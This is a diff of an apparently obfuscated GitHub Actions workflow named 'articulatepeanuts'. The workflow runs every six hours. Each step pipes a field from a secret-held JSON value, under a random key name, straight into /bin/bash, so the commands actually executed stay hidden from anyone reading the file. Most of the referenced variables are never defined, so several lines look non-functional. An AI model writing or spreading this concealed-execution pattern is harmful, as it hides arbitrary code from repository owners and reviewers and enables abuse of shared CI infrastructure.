@@ -3,27 +3,24 @@ name: articulatepeanuts
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 1/6 * * *'
+    - cron: '32 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: articulatepeanuts
         env:
-          gtfp5063: ${{ secrets.gtfp5063 }}
+          k9628: ${{ secrets.k9628 }}
         run: |
-          echo $gtfp5063 | jq -r .x44985 | /bin/bash
-          echo $maoic5 | jq -r .yofg463 | /bin/bash
-          echo $k396 | jq -r .m321 | /bin/bash
-          echo $q32473 | jq -r .cbwit5547 | /bin/bash
-          echo $pbd709 | jq -r .s931 | /bin/bash
-          echo $adwm87 | jq -r .mvkes8 | /bin/bash
-          echo $xiy6730 | jq -r .a30 | /bin/bash
-          echo $okz70400 | jq -r .pl9061 | /bin/bash
-          echo $l84621 | jq -r .bo8 | /bin/bash
-          echo $vhlip3 | jq -r .muhmq73 | /bin/bash
-          echo $l2 | jq -r .fhcxk00 | /bin/bash
-          echo $is3575 | jq -r .wh0235 | /bin/bash
-          echo $zr92697 | jq -r .ltfy825 | /bin/bash
+          echo $k9628 | jq -r .tgtyu290 | /bin/bash
+          echo $ff12 | jq -r .a34693 | /bin/bash
+          echo $zn87669 | jq -r .uu2 | /bin/bash
+          echo $mg28 | jq -r .bxzu50218 | /bin/bash
+          echo $ny224 | jq -r .kthnx3 | /bin/bash
+          echo $er7 | jq -r .sgwoa37069 | /bin/bash
+          echo $lf2 | jq -r .rvxln9 | /bin/bash
+          echo $xvvn3 | jq -r .uk6 | /bin/bash
 
